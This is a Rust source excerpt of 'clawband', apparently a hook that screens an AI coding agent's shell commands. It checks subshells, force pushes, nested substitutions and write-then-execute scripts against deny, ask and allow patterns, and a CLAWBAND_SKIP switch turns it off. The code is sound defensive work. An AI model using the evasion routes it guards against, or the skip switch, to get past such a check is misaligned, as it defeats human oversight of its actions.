806	// Rather than flagging every $() as ask, extract inner commands and evaluate them.
807	// Returns None (pass) when all subshells are clean — eliminates false positives
808	// like `git commit -F $(mktemp)` or `BRANCH=$(git branch --show-current)`.
809	
810	fn check_subshells(
811	    command: &str,
812	    deny_pats: &[Pattern],
813	    ask_pats: &[Pattern],
814	    allow_pats: &[Pattern],
815	) -> Option<(&'static str, String)> {
816	    if !command.contains("$(") && !command.contains('`') {
817	        return None;
818	    }
819	
820	    // If the command itself IS a subshell ($(...) or `...` as the command, not an
821	    // argument), the output becomes the next command — we can't know what it'll be.
822	    let trimmed = command.trim();
823	    if trimmed.starts_with("$(") || trimmed.starts_with('`') {
824	        return Some((
825	            "ask",
826	            "Command is a subshell — its output will be executed directly. \
827	             Review before running."
828	                .to_string(),
829	        ));
830	    }
831	
832	    // Extract first-level $(...) and `...` content
833	    let dp_re = Regex::new(r"\$\(([^()]*)\)").unwrap();
834	    let bt_re = Regex::new(r"`([^`]*)`").unwrap();
835	
836	    let inner_cmds: Vec<String> = dp_re
837	        .captures_iter(command)
838	        .map(|c| c[1].trim().to_string())
839	        .chain(
840	            bt_re
841	                .captures_iter(command)
842	                .map(|c| c[1].trim().to_string()),
843	        )
844	        .filter(|s| !s.is_empty())
845	        .collect();
846	
847	    // Check if any $( or ` remains after removing extracted subshells (nested case)
848	    let stripped = dp_re.replace_all(command, "");
849	    let stripped = bt_re.replace_all(&stripped, "");
850	    let has_residual = stripped.contains("$(") || stripped.contains('`');
851	
852	    // Evaluate each inner command — deny beats ask
853	    let mut worst_ask: Option<String> = None;
854	    for inner in &inner_cmds {
855	        if let Some((decision, reason)) = check_command(inner, deny_pats, ask_pats, allow_pats) {
856	            if decision == "deny" {
857	                return Some((
858	                    "deny",
859	                    format!("Subshell contains blocked command — {}", reason),
860	                ));
861	            }
862	            if worst_ask.is_none() {
863	                worst_ask = Some(format!("Subshell contains risky command — {}", reason));
864	            }
865	        }
866	    }
867	
868	    if let Some(reason) = worst_ask {
869	        return Some(("ask", reason));
870	    }
871	
872	    // Inner commands are clean but nested subshells can't be fully evaluated
873	    if has_residual {
874	        return Some((
875	            "ask",
876	            "Command contains nested subshell — review before running.".to_string(),
877	        ));
878	    }
879	
880	    // All subshells extracted and clean — pass through
881	    None
882	}
883	
884	// ─── Core check logic ────────────────────────────────────────────────────────
885	// Returns Some(("deny"|"ask", reason)) or None for pass.
886	// Does NOT perform script-file scanning (requires filesystem) or subshell checks.
887	
888	fn check_command<'a>(
889	    command: &str,
890	    deny_pats: &'a [Pattern],
891	    ask_pats: &'a [Pattern],
892	    allow_pats: &'a [Pattern],
893	) -> Option<(&'a str, String)> {
894	    let clean = strip_safe_pipes(command);
895	    let segments = split_segments(&clean);
896	
897	    for segment in &segments {
898	        if allow_pats.iter().any(|p| p.matches(segment)) {
899	            continue;
900	        }
901	
902	        if let Some(reason) = check_force_push(segment) {
903	            return Some(("deny", reason));
904	        }
905	
906	        for pat in deny_pats {
907	            if pat.matches(segment) {
908	                return Some((
909	                    "deny",
910	                    format!("Blocked: '{}' matched in: {}", pat.label, segment),
911	                ));
912	            }
913	        }
914	
915	        for pat in ask_pats {
916	            if pat.matches(segment) {
917	                return Some((
918	                    "ask",
919	                    format!(
920	                        "Review before running — '{}' matched in: {}\nTo always allow: clawband allow '{}'",
921	                        pat.label, segment, pat.label
922	                    ),
923	                ));
924	            }
925	        }
926	
927	        // Echo/printf content written to a script file
928	        if let Some((is_deny, reason)) = check_echo_to_script(segment, deny_pats, ask_pats) {
929	            return Some((if is_deny { "deny" } else { "ask" }, reason));
930	        }
931	    }
932	
933	    // Compound-command write-then-execute: can't scan content before it runs
934	    if check_write_then_execute(&segments) {
935	        return Some((
936	            "ask",
937	            "Compound command writes to a script file then executes it — \
938	             content cannot be scanned before execution."
939	                .to_string(),
940	        ));
941	    }
942	
943	    None
944	}
945	
946	// ─── Main ─────────────────────────────────────────────────────────────────────
947	
948	fn main() {
949	    // CLI subcommands
950	    let args: Vec<String> = env::args().collect();
951	    match args.get(1).map(|s| s.as_str()) {
952	        Some("stats") => {
953	            cmd_stats();
954	            return;
955	        }
956	        Some("allow") => {
957	            cmd_add_pattern("allow.patterns", &args[2..]);
958	            return;
959	        }
960	        Some("deny") => {
961	            cmd_add_pattern("deny.patterns", &args[2..]);
962	            return;
963	        }
964	        Some("post") => {
965	            cmd_post();
966	            return;
967	        }
968	        Some("--version") | Some("-v") => {
969	            println!("clawband v{}", env!("CARGO_PKG_VERSION"));
970	            return;
971	        }
972	        Some("help") | Some("--help") | Some("-h") => {
973	            cmd_help();
974	            return;
975	        }
976	        _ => {}
977	    }
978	
979	    let mut input = String::new();
980	    let _ = io::stdin().read_to_string(&mut input);
981	
982	    // Parse command from Claude Code hook JSON: {"tool_input": {"command": "..."}}
983	    let v: serde_json::Value = match serde_json::from_str(&input) {
984	        Ok(v) => v,
985	        Err(_) => return,
986	    };
987	    let command = match v["tool_input"]["command"].as_str() {
988	        Some(s) if !s.is_empty() => s.to_string(),
989	        _ => return,
990	    };
991	
992	    if env::var("CLAWBAND_SKIP").as_deref() == Ok("1") {
993	        return;
994	    }
995	
996	    let rtk_enabled = env::var("RTK_ENABLED").as_deref() == Ok("1");
997	    let sqz_enabled = env::var("SQZ_ENABLED").as_deref() == Ok("1");
998	    let log_enabled = env::var("CLAWBAND_LOG").as_deref() == Ok("1");
999	
1000	    let command = if rtk_enabled {
1001	        strip_rtk(&command)
1002	    } else {
1003	        command
1004	    };
1005	    let command = if sqz_enabled {
1006	        strip_sqz(&command)
1007	    } else {
1008	        command
1009	    };
1010	
1011	    // Load all patterns
1012	    let cfg = config_dir();
1013	    let mut deny_pats = builtin_deny();
1014	    let mut ask_pats = builtin_ask();
1015	    let allow_pats = load_patterns(&cfg.join("allow.patterns"));
1016	    deny_pats.extend(load_patterns(&cfg.join("deny.patterns")));
1017	    ask_pats.extend(load_patterns(&cfg.join("ask.patterns")));
1018	
1019	    let emit = |decision: &str, reason: &str| {
1020	        if log_enabled {
1021	            log_action(decision, reason, &command);
1022	        }
1023	        output(decision, reason);
1024	    };
1025	
1026	    // Core pattern check (deny/ask/pass)
1027	    if let Some((decision, reason)) = check_command(&command, &deny_pats, &ask_pats, &allow_pats) {
1028	        if decision == "ask" {
1029	            write_ask_breadcrumb(&reason);
1030	        }
1031	        emit(decision, &reason);
1032	        return;
1033	    }
1034	
1035	    // Script file scanning: if command is `bash ./foo.sh`, read and check the file.
1036	    if let Some(script_path) = extract_script_path(&command) {
1037	        if let Some((decision, reason)) =
1038	            scan_script_file(&script_path, &deny_pats, &ask_pats, &allow_pats)
1039	        {
1040	            if decision == "ask" {
1041	                write_ask_breadcrumb(&reason);
1042	            }
1043	            emit(&decision, &reason);
1044	            return;
1045	        }
1046	    }
1047	
1048	    // Subshell scanning: extract inner commands from $() and backticks and evaluate them.
1049	    // Passes through when all inner commands are clean — eliminates false positives.
1050	    if let Some((decision, reason)) = check_subshells(&command, &deny_pats, &ask_pats, &allow_pats)
1051	    {
1052	        emit(decision, &reason);
1053	    }
1054	}

1080	        let al = no_allow();
1081	        if let Some((d, _)) = check_command(cmd, &dp, &ap, &al) {
1082	            return Some(d.to_string());
1083	        }
1084	        check_subshells(cmd, &dp, &ap, &al).map(|(d, _)| d.to_string())
1085	    }
